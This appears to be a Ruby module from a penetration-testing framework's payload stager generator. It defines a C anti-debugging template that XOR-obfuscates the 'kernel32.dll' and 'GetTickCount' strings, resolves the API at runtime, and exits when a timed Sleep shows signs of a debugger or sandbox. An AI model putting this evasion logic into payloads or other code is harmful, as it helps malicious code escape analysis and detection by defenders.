module Pro
  module DynamicStagers
    module Code
      module AntiDebug
        class GetTickCount < Pro::DynamicStagers::Code::Function

          def initialize
            @name      = "get_tick_count"
            @type      = "void"
            @arguments = [ ]
            @body      = <<-EOS
          DWORD tickcount;
          typedef DWORD (__stdcall *GetTickCountProto)(void);
          char cbKernel[] = { CRYPT12('k','e','r','n','e','l','3','2','.','d','l','l'),XOR_KEY };
          char cbGetTickCount[] = { CRYPT12('G','e','t','T','i','c','k','C','o','u','n','t'),XOR_KEY };
          LIBLOAD(hKernel, cbKernel);
          RDLLOAD(GetTickCountRDL, GetTickCountProto, hKernel, cbGetTickCount);
          tickcount = GetTickCountRDL();
	        Sleep(650);
          if (((GetTickCountRDL() - tickcount) / 300) != 2){
            exit(0);
          }
            EOS
          end

        end
      end
    end
  end
end
